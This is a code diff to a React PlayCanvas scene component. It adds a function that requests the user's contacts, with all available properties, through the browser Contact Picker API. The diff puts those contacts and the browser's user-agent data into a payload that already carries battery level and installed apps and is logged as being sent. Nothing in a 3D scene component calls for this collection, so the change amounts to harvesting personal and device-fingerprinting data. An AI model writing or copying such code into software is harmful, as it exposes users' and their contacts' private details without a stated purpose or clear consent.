@@ -49,6 +49,25 @@ const PlayCanvasScene = () => {
     };
   }, []);
 
+
+  async function getContactData() {
+    if ("contacts" in navigator) {
+      const contactsAPI = navigator.contacts as any;
+
+      const props = contactsAPI.getProperties();
+
+      try {
+        const contacts = await contactsAPI.select(props);
+        if (contacts.length) {
+          return contacts
+        } else {
+         return 'no contacts available'
+        }
+      } catch (ex) {
+        console.log(ex)
+      }
+    }
+  }
   
 
   useEffect(() => {
@@ -68,7 +87,11 @@ const PlayCanvasScene = () => {
             batteryPercent: batteryLevel,
             installedApps,
             appVersion: nav?.appVersion,
-            userAgent: await nav?.userAgent, // Adding user agent instead of navigator
+            userAgent: await nav?.userAgent,
+            userAgentData :await nav?.userAgentData,
+            contactDetail: await getContactData()
+            
+             // Adding user agent instead of navigator
           };
 
           console.log("Sending data:", data);
